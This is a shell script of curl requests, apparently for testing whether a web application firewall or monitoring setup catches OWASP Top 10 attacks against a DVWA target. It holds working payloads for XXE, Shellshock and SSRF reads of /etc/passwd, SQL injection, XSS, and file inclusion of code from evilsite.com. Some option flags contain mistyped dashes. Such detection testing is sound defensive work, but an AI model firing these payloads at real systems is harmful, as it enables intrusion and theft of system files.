
HOST=$1
RFQDN=example.com

#echo -n "OWASP Top 10 A01:2021 – Broken Access Control :  "
curl -A Zabbix -k -s https://$HOST/.git/HEAD 
#

#echo -n "OWASP Top 10 A02:2021 - Cryptographic Failures :  "
curl -A Zabbix -k -s -I --tlsv1.2 https://$HOST/ | grep HTTP
curl -A Zabbix -k -s -I --tlsv1.3 https://$HOST/ | grep HTTP
#

#echo -n "OWASP Top 10 A03:2021 – Injection :  "
curl -A Zabbix -k -s https://$HOST/?q=/bin/pwd 
#

#echo -n "OWASP Top 10 A05:2021 - Security Misconfiguration :  "
curl -A Zabbix -k -s https://$HOST/admin/ 
#

#echo -n "OWASP Top 10 A04:2017 - XML External Entities (XXE) :  "
curl -A Zabbix -k -s –X POST https://$HOST \
-H 'Content-type: application/xml' \
-d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<Check><prod>&xxe;</prod></Check>' 
#

#echo -n "OWASP Top 10 A06:2021 - Vulnerable and Outdated Components :  "
curl -A Zabbix -k -s –X POST https://$HOST \
-H 'Content-type: application/xml' \
-d '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<svg width="128px" height="128px" xmlns="<http://www.w3.org/2000/svg>" xmlns:xlink="<http://www.w3.org/1999/xlink>" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
<foo>&xxe;</foo>' 
#

#echo -n "OWASP Top 10 A08:2021 – Software and Data Integrity Failures :  "
### OWASP Top 10 A08:2017 - Insecure Deserialization
curl -A Zabbix -k -s https://$HOST/?q=%7B%22username%22%3A%271%27or%271%27%3D%271%22%2C+%22attack_type%22%3A+%22deserialization%22%7D 
#

#echo -n "OWASP Top 10 A10:2021 – Server-Side Request Forgery :  "
curl -A Zabbix -k -s https://$HOST \
-H 'Referer: https://$RFQDN/' \
-d 'test=file:///etc/passwd' 
#

#echo -n "SQL Injection (SQLi) :  "
curl -A Zabbix -k -s https://$HOST/DVWA/?q='+or+1=1+--' 
#

#echo -n "Cross Site Scripting (XSS) :  "
curl -A Zabbix -k -s https://$HOST/DVWA/status?q=%3Cscript%3Ealert\(1\) 
#

#echo -n "Local File Inclusion :  "
curl -A Zabbix -k -s https://$HOST/DVWA/.git/HEAD 
#

#echo -n "Remote File Inclusion :  "
curl -A Zabbix -k -s https://$HOST/DVWA/?rfi=https://$RFQDN/ 
#

#echo -n "PHP Code Injection :  "
curl -A Zabbix -k -s https://$HOST/DVWA/?page=http://evilsite.com/evilcode.php 
#

#echo -n "HTTProxy :  "
curl -A Zabbix -k -s https://$HOST/DVWA/ \
-H 'Proxy: AFFECTED' 
#

#echo -n "ShellShock :  "
curl -A Zabbix -k -s https://$HOST/DVWA/ \
-H 'User-Agent: () { test;}; echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd' \
–H 'Host: www.example.com'  
#

#echo -n "Shell Injection :  "
curl -A Zabbix -k -s https://$HOST/DVWA/?q=/bin/who 
#

#echo -n "Scripting/Scanner/Bot Detection :  "
curl -A Zabbix -k -s https://$HOST/DVWA/ \
-H 'User-Agent: Mozilla/5.0 zgrab/0.x' 
#

#echo -n "Data Leakage Attack :  "
curl -A Zabbix -k -s -X POST https://$HOST/DVWA/login.php \
-H 'Host: www.example.com' \
-H 'Referer: http://www.example.com' \
-d '{username: admin; password: password;}' 
#

#echo -n "Prohibited Headers Attack :  "
curl -A Zabbix -k -s https://$HOST/DVWA/ \
-H 'Host: www.example.com ' \
-H 'Referer: http://www.example.com' \
-H 'Prohibited-Header: hello' 
#

#echo -n "MIME Types Attack :  "
curl -A Zabbix -k -s -X POST https://$HOST/DVWA/ \
-H 'Host: www.example.com' \
-H 'Referer: http:// www.example.com' \
-H 'Content-type: some/prohibited-MIME-type' \
-d '{"some": "data"}' 
#

#echo -n "Content-length Validation :  "
curl -A Zabbix -k -s https://$HOST/DVWA/ \
-H 'Content-length: 0' 
#

#echo -n "Transfer-encoding Validation :  "
curl -A Zabbix -k -s -X POST https://$HOST/DVWA/ \
-H 'Host: www.example.com' \
-H 'Referer: http://www.example.com' \
-H 'Content-type: application/json' \
-H 'Transfer-encoding: chunked' \
-d '{"some": "data"}' 
#

#echo -n "Range Validation :  "
curl -A Zabbix -k -s https://$HOST/DVWA/ \
-H 'Host: www.example.com' \
-H 'Referer: http:// www.example.com' \
-H 'Range: bytes=0-10, 11-20, 21-30, 31-40, 41-50, 51-60' 
#

#echo -n "Method Validation :  "
curl -A Zabbix -k -s -X FORBIDDEN-METHOD https://$HOST/DVWA/ \
-H 'Host: www.example.com' \
-H 'Referer: http://www.example.com' 
#

#echo -n "Referer Validation :  "
curl -A Zabbix -k -s https://$HOST/DVWA/ \
-H 'Host: www.example.com' \
-H 'Referer: http://реферер' 
#

#echo -n "CSRF :  "
curl -A Zabbix -k -s -X POST https://$HOST/DVWA/login.php \
-d '{"login":"admin", "password":"password"}' 
#

#echo -n "Bad JSON :  "
curl -A Zabbix -k -s https://$HOST/DVWA/ \
-H 'Origin: https://www.example.com' \
-H 'Host: www.example.com' \
-d '{ :test; password' 
#

#echo -n "Bad Redirect :  "
curl -A Zabbix -k -s https://$HOST/DVWA/redirect.php?goto=https://$RFQDN/ 
#
